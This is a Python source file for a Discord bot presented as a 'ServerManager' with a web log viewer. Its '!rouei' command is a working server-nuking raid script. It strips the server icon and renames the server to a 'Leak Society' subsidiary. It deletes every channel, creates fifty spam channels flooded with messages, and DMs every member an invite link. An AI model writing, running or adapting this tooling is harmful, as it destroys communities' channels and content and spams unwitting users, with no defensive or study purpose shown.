import discord
import asyncio
import os
import logging
from discord.ext import commands
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

log_messages = []

class MemoryHandler(logging.Handler):
    def emit(self, record):
        log_entry = self.format(record)
        log_messages.append(log_entry)
        if len(log_messages) > 100:
            log_messages.pop(0)

memory_handler = MemoryHandler()
memory_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.getLogger().addHandler(memory_handler)

class LogHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Bot Logs</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }}
                    .container {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                    h1 {{ color: #333; }}
                    .logs {{ background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; max-height: 600px; overflow-y: auto; font-family: monospace; }}
                    .info {{ color: #ffffff; }}
                    .warning {{ color: #ffff00; }}
                    .error {{ color: #ff0000; }}
                    .timestamp {{ color: #888888; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🤖 Bot Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</h1>
                    <div class="logs" id="logContent">
            """
            
            for log in log_messages[-50:]:
                if "ERROR" in log:
                    log_class = "error"
                elif "WARNING" in log:
                    log_class = "warning"
                else:
                    log_class = "info"
                html_content += f'<div class="{log_class}">{log}</div>\n'
            
            html_content += """
                    </div>
                    <script>
                        setTimeout(function() {
                            location.reload();
                        }, 5000);
                        var logDiv = document.getElementById('logContent');
                        logDiv.scrollTop = logDiv.scrollHeight;
                    </script>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def start_http_server():
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), LogHandler)
    logger.info(f"📊 Log server started on port {port}")
    server.serve_forever()

class ServerManager(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def rouei(self, ctx):
        tasks = []
       
        tasks.append(self.delete_server_icon(ctx.guild))
        tasks.append(self.change_server_name(ctx.guild))
        tasks.append(self.manage_channels(ctx.guild))
        tasks.append(self.send_messages_to_members(ctx.guild))
       
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_server_icon(self, guild):
        try:
            await asyncio.sleep(0)
            if guild.icon:
                await guild.edit(icon=None)
                logger.info("サーバーアイコンを削除しました")
        except Exception as e:
            logger.error(f"アイコン削除エラー: {e}")

    async def change_server_name(self, guild):
        try:
            await asyncio.sleep(0)
            await guild.edit(name="漏洩会の傘下")
            logger.info("サーバー名を変更しました")
        except Exception as e:
            logger.error(f"サーバー名変更エラー: {e}")

    async def manage_channels(self, guild):
        try:
            for channel in guild.channels:
                try:
                    await asyncio.sleep(0)
                    await channel.delete()
                except Exception as e:
                    logger.error(f"チャンネル削除エラー: {e}")
           
            for i in range(50):
                try:
                    await asyncio.sleep(0)
                    channel = await guild.create_text_channel(f"test-channel-{i+1}")
                    asyncio.create_task(self.send_test_messages(channel))
                except Exception as e:
                    logger.error(f"チャンネル作成エラー: {e}")
                   
        except Exception as e:
            logger.error(f"チャンネル管理エラー: {e}")

    async def send_test_messages(self, channel):
        try:
            for i in range(20):
                await asyncio.sleep(0)
                await channel.send("test")
        except Exception as e:
            logger.error(f"メッセージ送信エラー: {e}")

    async def send_messages_to_members(self, guild):
        try:
            for member in guild.members:
                if not member.bot:
                    try:
                        await asyncio.sleep(0)
                        await member.send("# 漏洩会に参加 \n discord.gg/ozeunko")
                    except Exception as e:
                        logger.error(f"DM送信エラー {member}: {e}")
        except Exception as e:
            logger.error(f"メンバーDMエラー: {e}")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    logger.info(f'{bot.user} login')
    await bot.add_cog(ServerManager(bot))

if __name__ == "__main__":
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    bot.run(os.getenv('DISCORD_BOT_TOKEN'))
